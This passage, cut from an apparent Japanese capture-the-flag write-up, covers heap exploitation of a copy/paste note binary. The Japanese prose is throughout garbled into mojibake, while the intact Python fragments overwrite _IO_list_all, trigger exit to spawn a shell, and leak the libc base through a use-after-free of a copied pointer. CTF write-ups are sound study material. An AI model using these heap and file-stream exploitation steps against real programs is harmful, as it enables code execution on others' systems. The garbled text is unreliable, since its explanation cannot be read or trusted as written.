æ¬¡ã«Cã‚’copyã—ã¦Eã«pasteã—ã¦ã„ã‚‹ã€‚Cã¨Eã®ã‚µã‚¤ã‚ºã¯0x4ãªã®ã§pasteé–¢æ•°ã§0x8ãƒã‚¤ãƒˆmallocã•ã‚Œã‚‹ã€‚ã“ã‚Œã«ã‚ˆã‚Š **&_IO_list_allãŒè¿”ã‚‹ã€‚** &_IO_list_allã«ã¯sprintfã«ã‚ˆã‚ŠC.fd + E.fdãŒæ›¸ãè¾¼ã¾ã‚Œã‚‹ã®ã§ **&_IO_list_allã«&I.fdãŒæ›¸ãè¾¼ã¾ã‚Œã‚‹ã€‚**
```python: exploit.py
copy(2)
paste(4)
# tcache(0x20):
```
createã§ã¯ãªãcopy-pasteã‚’ä½¿ã£ã¦ã„ã‚‹ã®ã¯å‰è¿°ã®é€šã‚Šcreateã ã¨ä»¥ä¸‹ã®éƒ¨åˆ†ã§_IO_list_allãŒnullã«ãªã‚Šæ¬¡ã®printfã§æ­»ã¬ã‹ã‚‰ã€‚

```c: main.c#L69
  memset(list[idx].ptr, 0, list[idx].size);
  printf("Enter your content: ");
```
æœ€å¾Œã«exitã‚’å‘¼ã‚“ã§shellã‚’èµ·å‹•ã™ã‚‹ã€‚
```python: exploit.py
ex()

io.interactive()
```
å®Ÿéš›ã“ã®explioitã‚’å®Ÿè¡Œã™ã‚‹ã¨shellãŒèµ·å‹•ã—ã¦ãƒ•ãƒ©ã‚°ãŒå–ã‚Œã‚‹ã€‚
![6](https://storage.googleapis.com/zenn-user-upload/12b7f398a8fe-20230506.png)

## libc base leak(åˆ¥è§£)
https://ptr-yudai.hatenablog.com/entry/2023/05/07/004235

ç«¶æŠ€ä¸­ã«ã¯æ°—ã¥ã‘ãªã‹ã£ãŸãŒcopyé–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ã¨copiedã«chunk.fdã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒä¿æŒã•ã‚Œã‚‹ã®ã§copyå¾Œã«deleteã—ã¦ã‚‚ã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ä½¿ãˆã‚‹ã€‚ãªã®ã§copyã—ãŸå¾Œã«deleteã—ã¦pasteã‚’å‘¼ã¹ã°freeã—ãŸchunkã®fdã‚’èª­ã¿å‡ºã›ã‚‹ã€‚ã“ã‚Œã‚’ä½¿ãˆã°libc base leakãŒåœ§å€’çš„ã«ç°¡å˜ã«ãªã‚‹ã€‚sprintfãŒå®Ÿè¡Œã•ã‚Œã‚‹æ™‚ã«index0ã®chunkãŒlarge binã«å…¥ã£ã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã€‚
```python
create(0, 0x420 - 8, b'')
create(1, 0x20 - 8, b'')
copy(0)
delete(0)
paste(1)
libc_base = unpack(show(1)[:8]) - 0x21a0d0
log.info('libc_base = %#016lx'%(libc_base))
```

# å‚è€ƒæ–‡çŒ®
https://smallkirby.hatenablog.com/entry/safeunlinking

[^1]: https://zenn.dev/ri5255/articles/dfc517df9467cd#fsop-in-libc2.34
